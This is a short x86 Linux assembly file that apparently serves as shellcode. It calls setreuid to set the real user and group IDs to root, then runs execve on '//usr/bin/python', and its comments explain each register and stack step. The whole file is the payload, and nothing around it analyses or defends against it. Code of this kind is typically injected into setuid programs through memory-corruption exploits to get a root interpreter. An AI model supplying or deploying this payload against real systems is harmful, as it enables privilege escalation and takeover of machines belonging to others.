section .text
    global _start

_start:
    ; Set real u/gid to root
    push byte 0x46
    pop eax
    xor ebx, ebx
    xor ecx, ecx
    int 0x80
    
    push ebx            ; Push null bytes to terminate the string
    push 0x6e6f6874     ; Push the //usr/bin/python string
    push 0x79702f6e     ; onto the stack
    push 0x69622f72
    push 0x73752f2f
    mul ebx             ; Zero out eax and edx as a sideffect of multiplication by 0
    mov ebx, esp        ; Place string addres into EBX (execve 1st arg, program name)
    mov al, 11          ; execve syscall #
    int 0x80
